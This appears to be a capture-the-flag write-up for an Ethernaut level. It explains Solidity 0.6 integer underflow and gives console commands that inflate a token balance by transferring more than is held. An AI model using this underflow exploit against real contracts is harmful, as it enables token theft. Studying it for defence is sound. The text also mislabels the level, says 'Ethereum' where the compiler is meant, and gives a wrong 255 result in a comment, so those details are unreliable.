# Level 5: Fallout

This is the level 5 of Ethernaut

This level zooms in on the concept of overflows and underflows of variables and the risks that come with that. I haven't recently encountered the issues we'll be talking about here, simply because Ethereum 0.8 (the version I've spent most time in) doesn't show the same behaviour as version 0.6 in which Ethernaut has been written. Let's dive in.

The hint we get at the top of this level is to look up what an odometer is. An odometer is the milage counter in your car and it will look somewhat like this.

Back in the day these meters used to be analog and had a maximum of six digits or 999.999. You can already guess what would happen if someone was able to drive the car that long to hit that maximum. The counter would start over at the next available value of the odometer which would be 000.000. In programming that would be called an overflow.

An underflow is the opposite. Imagine the analog meter with just six fixed digits sitting at 000.000 miles and you would drive it backwards. As you have noticed by now I have no knowledge of how cars work whatsoever. But I'd love to think that the odometer would count backwards and go to next available value in the other direction, being 999.999.

## Hack

In this hack, we need to trigger an overflow or underflow in order to end up with uint values that aren't what the contract developer expects them to be. Let me explain with an example.

```
Example.sol
```

If you run this code in remix, be sure to use compiler version 0.6. As you can see we have a variable named small with value 0. If we subtract 1 from that variable we end up with 255 as a result. Keep in mind that the variable is an unsigned 8 bit integer which cannot hold negative values and only holds 8 bits of data.

As you can see we can try to make a uint8 negative — this triggers an underflow — and it will turn out to actually contain a high value. The opposite is true when trying to increment a uint8 that has a value of 255. When we go higher than that, we'll trigger an overflow. This does not work in more recent versions of Solidity which will cause your transaction to revert when an overflow or underflow occurs.

Ok cool, now we can exploit the original code. Look at the transfer function. I've added comments with the value 21 we'll be submitting in order to cause the underflow (we received 20 tokens when generating the level).

```javascript
require(balances[msg.sender] - _value >= 0); // _value = 21 or more
balances[msg.sender] -= _value; // 20-21 = 255
balances[_to] += _value; // 0 + 21 = 21
```

To summarize:

- we received 20 tokens in our balance in the beginning of this level
- we will transfer 21 (more than 20) tokens to another address (pick any)
- this will cause an underflow, setting our balance to 255 (see comments above)

In the Ethernaut console, trigger the transfer():

```javascript
await contract.transfer("0x7F000649C3f42C2D80dc3bd99F3F5e7CB737092C", 21);
```

Check the player's balance;

```javascript
await contract.balanceOf(player).then((v) => v.toString());

// Output: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

This will increase your balance and your level will pass.

## Security lessons learned

Overflows will cause a revert since Solidity 0.8.0 so it's less of an issue as far as I understand. Before 0.8.0 it was also possible to use a library like openzeppelin's [SafeMath](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath), but on their website it's also mentioned that this is not necessary anymore when using Solidity 0.8 and up.

Done!
